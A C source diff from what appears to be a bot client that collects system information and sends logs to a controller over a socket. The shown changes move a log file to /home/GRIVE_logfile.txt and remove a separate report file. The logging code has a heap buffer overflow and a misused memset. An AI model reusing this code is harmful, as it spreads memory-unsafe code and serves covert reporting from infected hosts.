@@ -17,7 +17,7 @@ char* log_editor(char *action, bool success){
     char* log;
     log = (char*) malloc(sizeof(char)* (strlen(action)+21));
     memset(log, 0, sizeof(log));
-    sprintf(log, "action: %s, success: %d", action, success);
+    sprintf(log, "action: %s, success: %d-", action, success);
     return log;
 }
 
@@ -27,9 +27,9 @@ void printLog(char* log){
     seconds = time(NULL);
     struct tm *ptm = localtime(&seconds);
 
-    FILE* logfile = fopen("/tmp/GRIVE_logfile.txt", "a");
+    FILE* logfile = fopen("/home/GRIVE_logfile.txt", "a");
     if(logfile != NULL)
-     fprintf(logfile, "%02d/%02d/%02d %02d:%02d:%02d : %s \n", ptm->tm_mday, ptm->tm_mon+1, ptm->tm_year+1900, ptm->tm_hour, 
+     fprintf(logfile, "%02d/%02d/%02d %02d:%02d:%02d : %s\n", ptm->tm_mday, ptm->tm_mon+1, ptm->tm_year+1900, ptm->tm_hour, 
            ptm->tm_min, ptm->tm_sec, log);
         fclose(logfile);
 
@@ -71,20 +71,6 @@ bool send_log(int sockfd, char* log, int BOT_ID){
 
 }
 
-
-void print_repo(char* log){
-
-    time_t seconds;
-    seconds = time(NULL);
-    struct tm *ptm = localtime(&seconds);
-
-    FILE* logfile = fopen("report.txt", "a");
-    if(logfile != NULL)
-     fprintf(logfile, "%02d/%02d/%02d %02d:%02d:%02d : %s \n", ptm->tm_mday, ptm->tm_mon+1, ptm->tm_year+1900, ptm->tm_hour, 
-           ptm->tm_min, ptm->tm_sec, log);
-        fclose(logfile);
-
-}
 
 bool system_info(int sockfd, int BOT_ID){
   // collect the system information on a temp file then send them to the bot
@@ -151,7 +137,7 @@ bool report(int sockfd, int BOT_ID){
     char * line = NULL;
     size_t len = 0;
     ssize_t read;
-    fp = fopen("report.txt", "r");
+    fp = fopen("/home/GRIVE_logfile.txt", "r");
     if (fp == NULL)
         return 0;
 
@@ -161,7 +147,6 @@ bool report(int sockfd, int BOT_ID){
     fclose(fp);
     if (line)
     free(line);
-    remove("report.txt");
     return 1;
 
 }
